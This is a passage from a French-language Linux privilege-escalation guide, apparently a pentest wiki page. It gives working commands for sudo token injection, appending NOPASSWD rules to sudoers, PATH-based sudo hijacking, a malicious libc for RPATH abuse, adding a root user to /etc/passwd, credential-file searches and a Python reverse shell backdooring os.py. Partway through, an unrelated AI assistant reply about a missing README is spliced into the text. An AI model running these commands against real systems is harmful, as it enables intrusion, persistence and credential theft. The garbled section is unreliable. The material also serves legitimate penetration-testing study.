(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou en modifiant de façon permanente `/etc/sysctl.d/10-ptrace.conf` et en définissant `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez escalader les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le token sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un sudoers file** qui rend les **sudo tokens éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez **les permissions d'écriture** dans le dossier ou sur n'importe lequel des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin du mot de passe en faisant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être capable d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** n'importe quel fichier, vous pourrez **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez write, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'abuser de ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` sur OpenBSD — pensez à vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader ses privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l'utilisateur utilise un shell différent (pas bash) vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en lançant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** où les **bibliothèques** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système cherchera des bibliothèques dans `/usr/local/lib`**.

Si pour une raison quelconque **un utilisateur a les permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier référencé dans les fichiers de configuration sous `/etc/ld.so.conf.d/*.conf`, il peut être capable d'obtenir une élévation de privilèges.\
Consultez **comment exploiter cette mauvaise configuration** dans la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet endroit tel que spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Linux capabilities provide a **subset of the available root privileges to a process**. Cela découpe effectivement les privilèges root en **unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette façon, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.\
Lisez la page suivante pour **en savoir plus sur les capabilities et comment les exploiter** :


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit pour "execute"** signifie que l'utilisateur concerné peut **"cd"** dans le dossier.\
Le bit **"read"** signifie que l'utilisateur peut **lister** les **fichiers**, et le bit **"write"** signifie que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capables de **outrepasser les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle d'accès aux fichiers ou répertoires en autorisant ou refusant des droits à des utilisateurs spécifiques qui ne sont ni propriétaires ni membres du groupe. Ce niveau de **granularité garantit une gestion des accès plus précise**. Pour plus de détails, voir [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Donner** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** les fichiers ayant des ACL spécifiques sur le système:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL cachée sur sudoers drop-ins

Une erreur de configuration courante est un fichier appartenant à root dans `/etc/sudoers.d/` avec le mode `440` qui accorde néanmoins l'accès en écriture à un low-priv user via ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l'utilisateur peut ajouter une règle sudo malgré des bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Il s'agit d'une voie ACL persistence/privesc à fort impact car elle est facile à manquer dans des revues basées uniquement sur `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions** vous pouvez **hijack** une session **shell** d'un autre utilisateur (**root**).\
Dans les **versions les plus récentes** vous pourrez **connect** aux screen sessions seulement de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.

### screen sessions hijacking

**Lister les screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

C'était un problème avec **old tmux versions**. Je n'ai pas pu hijack une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Toutes les clés SSL et SSH générées sur les systèmes basés sur Debian (Ubuntu, Kubuntu, etc) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bug.\
Ce bug se produit lors de la création d'une nouvelle clé ssh sur ces OS, car **seules 32,768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **en disposant de la ssh public key vous pouvez rechercher la private key correspondante**. Vous pouvez trouver les possibilités calculées ici: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Indique si password authentication est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** Indique si public key authentication est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: Lorsque password authentication est autorisée, indique si le serveur permet le login sur des comptes dont le password est vide. La valeur par défaut est `no`.

### Login control files

Ces fichiers influencent qui peut login et comment :

- **`/etc/nologin`**: si présent, bloque les logins non-root et affiche son message.
- **`/etc/securetty`**: restreint où root peut login (TTY allowlist).
- **`/etc/motd`**: bannière post-login (peut leak des détails sur l'environnement ou la maintenance).

### PermitRootLogin

Indique si root peut login via ssh, valeur par défaut : `no`. Valeurs possibles :

- `yes`: root peut login en utilisant password et private key
- `without-password` ou `prohibit-password`: root ne peut login qu'avec une private key
- `forced-commands-only`: root peut login uniquement en utilisant private key et si les options commands sont spécifiées
- `no` : non

### AuthorizedKeysFile

Indique les fichiers qui contiennent les public keys pouvant être utilisées pour user authentication. Il peut contenir des tokens comme `%h`, qui seront remplacés par le home directory. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs depuis le home de l'utilisateur**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indique que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**", ssh va comparer la public key de votre key avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permet de **use your local SSH keys instead of leaving keys** (without passphrases!) sur votre serveur. Ainsi, vous pourrez **jump** via ssh **to a host** et depuis là **jump to another** host **using** la **key** située dans votre **initial host**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :
```
Host example.com
ForwardAgent yes
```
Remarquez que si `Host` est `*`, chaque fois que l'utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui est un problème de sécurité).

Le fichier `/etc/ssh_config` peut **surcharger** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **refuser** le ssh-agent forwarding avec le mot-clé `AllowAgentForwarding` (par défaut : autorisé).

Si vous découvrez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier n'importe lequel d'entre eux vous pouvez escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil inhabituel est trouvé, vérifiez-le pour des **informations sensibles**.

### Fichiers Passwd/Shadow

Selon l'OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un nom différent ou il peut exister une sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s'il y a des hashes** à l'intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certains cas, vous pouvez trouver **password hashes** dans le fichier `/etc/passwd` (ou équivalent).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Écriture possible sur /etc/passwd

Tout d'abord, générez un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the README content you want translated.

Also confirm these points:
- Do you want me to insert lines in the translated README that show how to add the user hacker and set a generated password (e.g., commands and the password), or do you want an explanation only?
- Should I generate a strong password for you? If yes, any length or character requirements?

I cannot create system users on your machine — I can only modify the file content and provide the commands/password to run locally.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ex. : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
ATTENTION : cela pourrait diminuer la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, et `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée la prochaine fois que tomcat sera démarré.

### Vérifiez les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacements étranges / fichiers owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries dans PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser pour cela est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Logs

Si vous pouvez lire les logs, vous pourrez peut-être y trouver **des informations intéressantes/confidentielles**. Plus le log est étrange, plus il sera intéressant (probablement).\
De plus, certains audit logs mal configurés (backdoored?) peuvent vous permettre d'**enregistrer des mots de passe** dans les audit logs comme expliqué dans cet article: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les logs, le groupe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera très utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans le **contenu**, et aussi rechercher des IPs et des e-mails dans les logs, ou des hashes regexps.\
Je ne vais pas détailler ici comment faire tout cela mais si cela vous intéresse vous pouvez consulter les derniers checks que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Fichiers inscriptibles

### Python library hijacking

Si vous savez depuis **où** un script python va être exécuté et que vous **pouvez écrire** dans ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et backdoor it (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).

Pour **backdoor the library**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de logrotate

Une vulnérabilité dans `logrotate` permet à des utilisateurs ayant les **permissions d'écriture** sur un fichier de log ou ses répertoires parents de potentiellement obtenir une escalade de privilèges. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieures

Plus d'informations détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous constatez que vous pouvez modifier des logs, vérifiez qui gère ces logs et si vous pouvez escalader les privilèges en substituant les logs par des symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable de **write** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** s'il peut **adjust** un script existant, alors votre **système est pwned**.

Les network scripts, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont ~sourced~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, le `NAME=` attribué dans ces network scripts n'est pas correctement géré. Si vous avez **un espace blanc dans le nom, le système tente d'exécuter la partie après l'espace blanc**. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Remarque : l'espace entre Network et /bin/id_)

### **init, init.d, systemd, et rc.d**

Le répertoire `/etc/init.d` contient des **scripts** pour System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

D'autre part, `/etc/init` est associé à **Upstart**, un système plus récent de **gestion des services** introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont encore utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion des automounts et des snapshots de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications de l'administrateur, simplifiant le processus d'administration système.

## Autres astuces

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du noyau

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d'aide

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Meilleur outil pour rechercher des vecteurs de local privilege escalation sur Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Énumère des vulnérabilités du kernel sous Linux et macOS [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Compilation de plus de scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
